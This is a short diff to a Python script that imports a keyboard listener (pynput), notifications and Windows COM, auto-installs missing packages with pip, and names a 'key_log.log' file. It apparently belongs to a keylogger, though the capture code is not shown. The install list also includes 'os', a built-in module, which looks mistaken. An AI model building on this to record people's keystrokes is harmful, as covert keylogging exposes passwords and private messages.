@@ -1,7 +1,5 @@
 import subprocess
 import sys
-import os
-import win32com.client  
 
 def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
@@ -9,10 +7,14 @@ def install(package):
 try:
     from pynput.keyboard import Key, Listener
     from plyer import notification
+    import os
+    import win32com.client 
 except ImportError:
-    list1 = ['tkinter', 'pynput', 'plyer', 'pywin32','win32com']
+    list1 = ['pynput', 'plyer', 'pywin32','win32com','os']
     for i in list1:
         install(i)
+
+
 
 log_file = "key_log.log"
 log_content = ""
